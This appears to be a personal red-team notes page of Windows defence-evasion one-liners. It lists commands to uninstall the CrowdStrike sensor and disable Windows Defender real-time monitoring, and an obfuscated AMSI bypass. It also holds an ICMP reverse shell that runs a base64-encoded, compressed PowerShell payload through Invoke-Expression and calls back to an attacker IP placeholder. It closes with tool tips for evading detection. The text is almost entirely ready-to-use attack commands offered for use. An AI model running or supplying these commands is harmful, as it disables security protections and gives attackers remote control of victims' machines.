Wiki with some of my testing notes, no garuntee they'll work for you or be accurate.

GLHF





Bypass CrowdStrike
wmic product where "description='CrowdStrike Sensor Platform'" Uninstall

Bypass AMSI
powershell [Ref].Assembly.GetType('System.Management.Automation.' + 'A' + 'm' + 's' + 'i' + 'Utils').GetField('a' + 'm' + 's' + 'i' + 'InitFailed','NonPublic,Static').SetValue($null,$true)

Disable Windows Defender:
powershell Set-MpPreference -DisableRealtimeMonitoring $true

C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $True

ICMP reverse shell oneliner
powershell [Ref].Assembly.GetType('System.Management.Automation.' + 'A' + 'm' + 's' + 'i' + 'Utils').GetField('a' + 'm' + 's' + 'i' + 'InitFailed','NonPublic,Static').SetValue($null,$true); Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('xFf9T9s4GP49f8Ur4EY7SPpxK9rQDakU7q4alIoi7U5oYm7qNj4SO7MdSm/H/36v7aRNChvrTdNVgsaO/bzP+7wfdqcZDzUTHPr8TtxSfyjmVI4iGsf9MEm9z+D9su0Foz8HF8NRf+QNmIoIn4EKJUs1zCMWRhASDmMKmaITmAoJBC7pHZWKAuOaSoIG7iiskGEqRYKrNJEzqkHgWuj3zocBeF5wcjrqXfaHV/2LgXcVMVWYMkYkDamBCkWSED5RBZCiEjH2gd7TMNMUdERxmk9wg84kN2N8VFmsQQs7cjuQMkNnBI8XjoCHJpcvcWnh1ZzpCJgGpMNQFhXdJEG6cOYNnJvEHSJWUIu0TtVhozHDXdk4QLYNxj9lTI0bbmEdDQXD7mX3/PTq9BL6w+5kgvyUtd4fAnFDENMS2UbMlKbcEQsF5zQ07lShTmhMFt4VS4z2uBHXGZkwKC5UFi6PHWFa5fHKBV055EwGiDclRjZ0vFPA2TCtTB5n0ykGlv1NnXj4YIiLTKeZzt9aoIw4oFb7tSF9+kf3fHh26m2DWqhQx+DPgVMdsPTuVWB0uqFhJG7YjAtJb0gcv23h2nShI8zWchRab9pB6+B10O68Ctrtg8q45XmXGQcyFuW0QQEVJp9Gz5eiIiiBM8aze7MOqeNcTVN8OzHv3pGYudcYvLJ1dIhAasDyaJVzAf28cOnncn0fZObGYxqLecEIlw1HcPR0DYK/zI91Vz2vax1TkZgjDY4FQJI0tvrj6AvVJ/PiLHJImVkb1LP+4J1nsheTdz6fBzHqNiUp6qMlMV3C6iFtRrebrU6j2WnMKb31xdRPjQEL5dv/yp+Qhd8JIp3E3hMVoUiCmASp3za46yre9hGsPp75d91LJjHVx4xPsFJr9Q8wJJIkNc8rll3bCYq0akOhmO1lb6G5D+coLNFCLnC4o2VG6x9Wm0ZaIt5qYmep8f5z0K016CmJVQW7z3UJ2FYkrus8C9zeDHhVd4ZU+7WDr7uv7WOiWIhZLrMQWyB1lZ2HFnM/vDVdd4o5aIPxKcPAIguFYW223jQ7PzcUtZL7Y1zrh5nSIvFNavumKn1UKsXl1HPiYe/sxYxyjVQGdO5fjP8ymTVaYLokwQCrGv/mQt72OTacxOZSMER4t988XaSWwKYA+bZHOMEJZuuvkswSx2rnCjMg1wZcHZA0pRgHHlJ7VuQNS9IJw3PGxmRMlKt+Wz1TLF0f3kumsWPAeAHH+HWF5wt2ihdwQrDKfidysnBcjH7jBRYMGq9da3qvA8pDYTT9cHjYHfX6/XrwG6a2WVPbeo8Zboq4XKcZ5+Z4IsocQhK2YA92KL87NCOO+YPjLcNu+aJoXMXLj7wn0oVks0hDrVcHU7NwzkIplJhq6AmZClfYAXSNRbNSmaPStP9J8JF/5Fv19RgHI3StVqqYgya8hFaziUW3cnu/Eo46/AMXmfYHWRznURhh0/pKl0oxYVP9X7TcxV66i+7XcMY/E6F1sB4MCZ7he7B7BLs/yCU8YrH31lyzsTOfV+W6oQ85R7tV0jS2HeE7CS8Rlw/bvYiGt/YS0Hv6CrBcyqbomWUSuM6zglt5mdN1veEZR10L/hJmgWQuH4iTn4yn96nx1tSmXxBe2WsfvWjlQXHgsIa3WQxy82sYWKf0HvdfYxOKcBf2UCFrK+ggpnymo0apP68jmPPJq8xt205FsFPF5p4gi2aEtYFXlQQvP/aGQt3VBU1V77FBBcxGap0P+DMNX+RUjaD5FLnMwMcI5F7XHy17vLEqdNuk7XJ0jXgvyySCoIZTe616edZvlQ69Cuy35H+lANpfKdknLTDYw2vm+vTDoxnMjYQw056LfCgpfuYU/6ms9yOEvJ4qKD6n0PwRIj8i978oXJWxOqKxos+k5ObkvpHbw/d0CTxk8bzZ+obzZiM/NnRj5UJFyKqII/Obxx/FlOKPilH+29BdUNeAHrwHDz//AgAA//8DAA==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); Invoke-PowershellICMP -IPAddress <myip>

Note:
CACTUSTORCH does not make any Kernel32 API declarations. Shellter has been fairly solid as well.
